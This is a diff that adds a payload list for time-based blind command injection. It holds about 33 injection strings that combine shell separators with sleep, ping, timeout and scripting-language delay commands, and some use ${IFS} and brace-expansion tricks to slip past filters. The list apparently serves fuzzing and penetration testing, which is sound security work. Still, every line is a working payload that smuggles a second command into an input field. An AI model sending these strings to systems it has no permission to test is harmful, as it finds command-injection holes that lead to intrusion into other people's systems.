@@ -1,0 +1,33 @@
+# Blind Command Injection (Time-based)
+;sleep 5
+|sleep 5
+`sleep 5`
+$(sleep 5)
+& sleep 5
+&& sleep 5
+|| sleep 5
+;sleep${IFS}5
+|sleep${IFS}5
+$(sleep${IFS}5)
+`sleep${IFS}5`
+;{sleep,5}
+;sleep 5 #
+|sleep 5 #
+$(sleep 5) #
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+$(ping -c 5 127.0.0.1)
+`ping -c 5 127.0.0.1`
+& ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& timeout /t 5 /nobreak
+&& timeout /t 5 /nobreak
+;python -c "import time;time.sleep(5)"
+$(python -c "import time;time.sleep(5)")
+;perl -e "sleep(5)"
+$(perl -e "sleep(5)")
+;ruby -e "sleep(5)"
+$(ruby -e "sleep(5)")
+;php -r "sleep(5);"
+$(php -r "sleep(5);")
